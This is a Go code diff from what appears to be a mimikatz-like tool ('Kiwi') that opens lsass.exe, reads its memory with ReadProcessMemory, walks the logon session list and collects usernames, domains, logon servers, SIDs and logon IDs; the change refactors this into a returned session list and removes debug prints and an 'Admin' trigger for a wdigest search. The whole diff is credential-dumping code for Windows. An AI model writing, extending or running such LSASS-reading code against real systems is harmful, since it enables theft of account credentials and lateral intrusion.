@@ -198,7 +198,7 @@ type msv10List63 struct {
 	unknown11     uint32
 	unknown12     uint32
 	unknown13     uintptr
-	luid0         windows.LUID
+	logonID       windows.LUID // logon ID
 	luid1         windows.LUID
 	waZa          [12]byte
 	username      api.LSAUnicodeString
@@ -229,7 +229,7 @@ type msv10List63 struct {
 
 type lsaEnum struct {
 	size                  uintptr
-	offsetToLUID          uint32
+	offsetToLogonID       uint32
 	offsetToLogonType     uint32
 	offsetToSession       uint32
 	offsetToUsername      uint32
@@ -245,7 +245,7 @@ type lsaEnum struct {
 var lsaEnums = map[uint32]*lsaEnum{
 	buildMinWin10: {
 		size:                  unsafe.Sizeof(msv10List63{}),
-		offsetToLUID:          uint32(unsafe.Offsetof(msv10List63{}.luid0)),
+		offsetToLogonID:       uint32(unsafe.Offsetof(msv10List63{}.logonID)),
 		offsetToLogonType:     uint32(unsafe.Offsetof(msv10List63{}.logonType)),
 		offsetToSession:       uint32(unsafe.Offsetof(msv10List63{}.session)),
 		offsetToUsername:      uint32(unsafe.Offsetof(msv10List63{}.username)),
@@ -279,24 +279,26 @@ func (kiwi *Kiwi) getLogonSessionList(pHandle windows.Handle, patch *patchGeneri
 			return nil, errors.WithMessage(err, "failed to search logon session list address")
 		}
 	}
+	address := kiwi.logonSessionListCountAddr
 	// get session list count
 	var count uint32
-	address := kiwi.logonSessionListCountAddr
 	_, err := api.ReadProcessMemory(pHandle, address, (*byte)(unsafe.Pointer(&count)), unsafe.Sizeof(count))
 	if err != nil {
 		return nil, errors.WithMessage(err, "failed to read logon session list count")
 	}
 	kiwi.log(logger.Debug, "logon session list count is", count)
-	// get session list
+
 	// var retCallback bool
 
 	enum := lsaEnums[buildMinWin10]
 
+	// get session list
+	var sessions []*LogonSession
 	const listEntrySize = 2 * unsafe.Sizeof(uintptr(0))
 	listAddr := kiwi.logonSessionListAddr - listEntrySize
 	for i := uint32(0); i < count; i++ {
 		listAddr += listEntrySize
-		// get logon session data address
+		// read logon session data address
 		var addr uintptr
 		_, err = api.ReadProcessMemory(pHandle, listAddr, (*byte)(unsafe.Pointer(&addr)), unsafe.Sizeof(addr))
 		if err != nil {
@@ -331,28 +333,19 @@ func (kiwi *Kiwi) getLogonSessionList(pHandle windows.Handle, patch *patchGeneri
 			if err != nil {
 				kiwi.log(logger.Debug, "failed to read SID from lsass.exe:", err)
 			}
+			logonID := *(*windows.LUID)(unsafe.Pointer(&buf[enum.offsetToLogonID]))
 			session := LogonSession{
+				LogonID:     logonID,
 				Domain:      domainName,
 				Username:    username,
 				LogonServer: logonServer,
 				SID:         sid,
 			}
-
-			fmt.Println("Domain:", session.Domain)
-			fmt.Println("Username:", session.Username)
-			fmt.Println("Logon server:", session.LogonServer)
-			fmt.Println("SID:", session.SID)
-			fmt.Println()
-
-			if username == "Admin" {
-				kiwi.searchWdigestListAddress(pHandle)
-			}
-
+			sessions = append(sessions, &session)
 			addr = *(*uintptr)(unsafe.Pointer(&buf[0]))
 		}
 	}
-
-	return nil, nil
+	return sessions, nil
 }
 
 func readSIDFromLsass(pHandle windows.Handle, address uintptr) (string, error) {
